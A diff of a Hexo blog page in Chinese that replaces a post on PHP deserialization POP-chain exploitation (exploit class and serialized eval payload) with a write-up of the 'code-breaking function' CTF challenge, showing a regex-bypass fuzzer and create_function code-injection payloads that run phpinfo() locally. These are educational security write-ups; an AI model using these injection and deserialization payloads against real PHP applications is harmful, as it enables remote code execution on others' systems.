@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -86,20 +86,26 @@
 
 
 
-<meta name="description" content="通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。 但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来 借用网上的代码： &amp;lt;?php class lemon { protected $ClassObj;  function __construct() { $this-&amp;gt;ClassObj">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="本篇属于我的代码审计学习系列 function题目代码： 123456789&amp;lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#123;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php反序列化pop链的构造">
-<meta property="og:url" content="https://yml-sec.top/2019/01/27/php反序列化pop链的构造/index.html">
+<meta property="og:title" content="code-breaking-function">
+<meta property="og:url" content="https://yml-sec.top/2019/05/14/code-breaking-function/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。 但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来 借用网上的代码： &amp;lt;?php class lemon { protected $ClassObj;  function __construct() { $this-&amp;gt;ClassObj">
+<meta property="og:description" content="本篇属于我的代码审计学习系列 function题目代码： 123456789&amp;lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#123;">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f73f04f184.jpg">
-<meta property="og:updated_time" content="2019-03-18T10:33:35.399Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-4ae16977d2eb3f5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-eb9121b2b76fa442.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-4d90e135d9ee9212.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-c137fb33e8eb007c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-7f6cad87b37c92d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-a483c19b458e9ff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-d2935ace079d9a59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-23fc39727c1336d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-05-14T09:57:47.801Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php反序列化pop链的构造">
-<meta name="twitter:description" content="通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。 但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来 借用网上的代码： &amp;lt;?php class lemon { protected $ClassObj;  function __construct() { $this-&amp;gt;ClassObj">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/18/5c8f73f04f184.jpg">
+<meta name="twitter:title" content="code-breaking-function">
+<meta name="twitter:description" content="本篇属于我的代码审计学习系列 function题目代码： 123456789&amp;lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#123;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/13385151-4ae16977d2eb3f5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -129,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/27/php反序列化pop链的构造/">
+  <link rel="canonical" href="https://yml-sec.top/2019/05/14/code-breaking-function/">
 
 
 
 
 
-  <title>php反序列化pop链的构造 | yemoli's blog</title>
+  <title>code-breaking-function | yemoli's blog</title>
   
 
 
@@ -271,7 +277,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/27/php反序列化pop链的构造/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/05/14/code-breaking-function/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -288,7 +294,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">php反序列化pop链的构造</h1>
+          <h1 class="post-title" itemprop="name headline">code-breaking-function</h1>
         
 
         <div class="post-meta">
@@ -300,8 +306,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-27T18:22:07+08:00">
-                2019-01-27
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-14T17:57:05+08:00">
+                2019-05-14
               </time>
             
 
@@ -332,7 +338,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  302
+                  624
                 </span>
               
 
@@ -348,7 +354,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  2
                 </span>
               
             </div>
@@ -369,71 +375,48 @@
       
 
       
-        <p>通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。</p>
-<p>但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来</p>
-<p>借用网上的代码：</p>
-<pre><code>&lt;?php
-class lemon {
-protected $ClassObj;
-
-function __construct() {
-$this-&gt;ClassObj = new normal();
-}
-
-function __destruct() {
-$this-&gt;ClassObj-&gt;action();
-}
-}
-
-class normal {
-function action() {
-echo &quot;hello&quot;;
-}
-}
-
-class evil {
-private $data;
-function action() {
-eval($this-&gt;data);
-}
-}
-
-unserialize($_GET[&apos;d&apos;]);
-</code></pre><p>其中类normal 和 evil同时拥有action方法，并且evil中的方法是可控的，我们可以通过反序列化来掉用evil类中的action方法</p>
-<p>exp:</p>
-<pre><code>&lt;?php
-class lemon {
-protected $ClassObj;
-
-function __construct() {
-$this-&gt;ClassObj = new evil();
-}
-
-function __destruct() {
-$this-&gt;ClassObj-&gt;action();
-}
-}
-
-class normal {
-function action() {
-echo &quot;hello&quot;;
-}
-}
-
-class evil {
-private $data = &quot;phpinfo();&quot;;
-function action() {
-eval($this-&gt;data);
-}
-}
-
-$a = new lemon();
-echo urlencode(serialize($a));
-</code></pre><p>会生成这样一段payload</p>
-<pre><code>O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
-</code></pre><p>用get方式传入</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f73f04f184.jpg" alt=""></p>
-<p>可以看到成功进行了利用 </p>
+        <p>本篇属于我的代码审计学习系列</p>
+<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>题目代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="bypass正则"><a href="#bypass正则" class="headerlink" title="bypass正则"></a>bypass正则</h2><p>题目中提供了两个可控的参数，但是我们需要绕过正则的限制，如何bypass正则我们可以进行字符fuzz测试</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-4ae16977d2eb3f5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">  j = hex(i)[<span class="number">2</span>:]</span><br><span class="line">  payload = <span class="string">"%"</span>+j</span><br><span class="line">  #print(payload)</span><br><span class="line">  url = <span class="string">"http://127.0.0.1/demo8.php?action="</span>+payload+<span class="string">"var_dump&amp;arg=yml"</span></span><br><span class="line">  <span class="selector-tag">html</span> = requests.get(url)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">"yml"</span> <span class="keyword">in</span> <span class="selector-tag">html</span><span class="selector-class">.text</span>:</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-eb9121b2b76fa442.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>可以看到%5c可以bypass正则</p>
+<p>关于为何%5c可以bypass掉正则，出题人有如下解释:</p>
+<blockquote>
+<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。<br>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+</blockquote>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>绕过正则后，我们重点来看利用点的函数类型</p>
+<p>函数需要两个参数，我们可以控制其中第二个参数进行getshell</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-4d90e135d9ee9212.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这样通过寻找，最终确定了create_function()函数，我们看一下官方文档</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-c137fb33e8eb007c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>简单解释就是参数$args控制匿名函数的参数，$code控制匿名函数的代码</p>
+<p>我们可以抽象出如下代码模式</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fuction a($args)</span><br><span class="line">&#123;</span><br><span class="line">	$code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不难联想到这样的模式可以通过代码注入的方式来getshell</p>
+<p>然后回归题目，我们看到可控参数在第二个，也就是$code部分，抽象出来的模型是这样的</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fuction a()</span><br><span class="line">&#123;</span><br><span class="line">	$code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后进行构造，我们可以尝试如下的方式来执行phpinfo()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">'121'</span>;&#125;phpinfo();<span class="comment">/*)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地看一下测试结果</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-7f6cad87b37c92d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>至此我们可以构造如下payload</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">action</span>=%<span class="number">5</span>ccreate_function&amp;arg=return <span class="string">'121'</span>;&#125;phpinfo();/*)&#123;</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-a483c19b458e9ff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>题目中的的可控参数为第二个，那么当可控参数为第一个的时候我们如何getshell呢？</p>
+<p>题目代码改成这样</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-d2935ace079d9a59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>构建利用原型</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fuction</span> a(<span class="variable">$arg</span>)</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这个时候，我们依然可以参考上面的利用方式，构造如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">'yml'</span>;&#125;phpinfo();<span class="comment">/*)&#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个时候可构造如下payload</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">action</span>=%<span class="number">5</span>ccreate_function&amp;arg=)&#123;return <span class="string">'yml'</span>;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-23fc39727c1336d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>成功实现代码执行</p>
 
       
     </div>
@@ -478,12 +461,6 @@ echo urlencode(serialize($a));
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
-          
-        </div>
-      
 
       
       
@@ -493,8 +470,8 @@ echo urlencode(serialize($a));
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/26/HGAME-2019-week1-writeup/" rel="next" title="HGAME 2019-week1 writeup">
-                <i class="fa fa-chevron-left"></i> HGAME 2019-week1 writeup
+              <a href="/2019/05/06/置顶-个人备忘笔记/" rel="next" title="置顶-个人备忘笔记">
+                <i class="fa fa-chevron-left"></i> 置顶-个人备忘笔记
               </a>
             
           </div>
@@ -502,10 +479,6 @@ echo urlencode(serialize($a));
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/28/CTF中常出现的PHP函数/" rel="prev" title="CTF中常出现的PHP函数">
-                CTF中常出现的PHP函数 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -557,8 +530,17 @@ echo urlencode(serialize($a));
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -681,6 +663,22 @@ echo urlencode(serialize($a));
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#function"><span class="nav-number">1.</span> <span class="nav-text">function</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass正则"><span class="nav-number">1.1.</span> <span class="nav-text">bypass正则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">1.2.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思考"><span class="nav-number">2.</span> <span class="nav-text">思考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
